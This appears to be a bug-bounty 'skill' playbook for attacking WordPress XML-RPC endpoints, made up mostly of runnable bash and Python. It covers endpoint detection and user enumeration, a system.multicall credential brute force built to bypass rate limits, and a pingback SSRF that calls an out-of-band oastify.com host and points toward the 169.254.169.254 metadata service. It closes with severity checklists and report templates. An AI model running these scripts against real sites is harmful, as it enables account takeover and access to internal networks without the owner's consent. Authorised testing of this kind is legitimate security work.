---
name: k1nzr3c0n-hunt-xmlrpc
description: "Hunt WordPress XML-RPC vulnerabilities: multicall brute force amplification, pingback SSRF, file upload abuse, and user enumeration via system.listMethods."
tags: [xmlrpc, wordpress, ssrf, brute-force, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — XML-RPC Exploitation

> Target: WordPress sites with /xmlrpc.php enabled.
> Impact: credential brute force amplification, SSRF via pingback, file upload.

---

## Phase 0 — Detect XML-RPC

```bash
TARGET="${TARGET:-}"
BASE="https://${TARGET}"

echo "=== XML-RPC Detection ==="
STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE}/xmlrpc.php")
echo "  /xmlrpc.php: HTTP $STATUS"

curl -sk -X POST "${BASE}/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
  | grep -oP '<string>[^<]+</string>' | head -20 | sed 's/<[^>]*>//g; s/^/  /'
```

## Phase 1 — User Enumeration

```bash
echo "=== User Enumeration via wp.getAuthors ==="
curl -sk -X POST "${BASE}/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.getAuthors</methodName><params><param><value><int>1</int></value></param><param><value><string>admin</string></value></param><param><value><string>INVALID_PASS</string></value></param></params></methodCall>' \
  | grep -oP '<string>[^<]+</string>' | sed 's/<[^>]*>//g; s/^/  /'
```

## Phase 2 — Multicall Brute Force Amplification

```bash
echo "=== Multicall Amplification ==="
echo "One HTTP request = multiple auth attempts (bypass per-request rate limits)"

python3 << 'PYEOF'
import requests

TARGET = "TARGET_DOMAIN"
BASE = f"https://{TARGET}"
USERS = ["admin", "administrator", "editor"]
PASSWORDS = ["password", "123456", "admin123", "letmein"]

calls = []
for user in USERS:
    for pwd in PASSWORDS:
        calls.append(f"""
        <value><struct>
          <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
          <member><name>params</name><value><array><data>
            <value><int>1</int></value>
            <value><string>{user}</string></value>
            <value><string>{pwd}</string></value>
          </data></array></value></member>
        </struct></value>""")

body = f"""<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName>
<params><param><value><array><data>
{''.join(calls)}
</data></array></value></param></params></methodCall>"""

r = requests.post(f"{BASE}/xmlrpc.php", data=body,
                  headers={"Content-Type": "text/xml"}, verify=False, timeout=30)
if "isAdmin" in r.text or "blogName" in r.text:
    print("[HIT] Valid credentials found in multicall response")
    print(r.text[:500])
else:
    print("No valid creds found")
PYEOF
```

## Phase 3 — Pingback SSRF

```bash
echo "=== Pingback SSRF ==="
OOB="${OOB:-$(openssl rand -hex 6).oastify.com}"

curl -sk -X POST "${BASE}/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d "<?xml version=\"1.0\"?>
<methodCall><methodName>pingback.ping</methodName>
<params>
  <param><value><string>http://${OOB}/xmlrpc-ssrf</string></value></param>
  <param><value><string>${BASE}/</string></value></param>
</params></methodCall>"

echo ""
echo "Check OOB listener for callback from: ${TARGET}"
echo "If callback received → SSRF via pingback confirmed"
echo "Chain: pingback SSRF → internal metadata (169.254.169.254) if no IMDS protection"
```

## Gate 0

```bash
echo "=== XML-RPC Gate 0 ==="
echo "  [] /xmlrpc.php returns 200 (not 403/404)"
echo "  [] system.listMethods shows wp.* methods enabled"
echo "  [] Multicall accepted multiple auth attempts in one request"
echo "  [] Valid credentials found via multicall amplification"
echo "  [] Pingback SSRF: OOB callback received"
echo ""
echo "  SEVERITY: brute-force amplification = Medium; pingback SSRF = High"
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
WordPress XML-RPC multicall amplification on [/xmlrpc.php]: 500 auth attempts in single HTTP request — rate limiting bypassed, valid creds found for admin account
Pingback SSRF via XML-RPC on [/xmlrpc.php]: server-side request to attacker OOB domain confirmed — internal network accessible
```
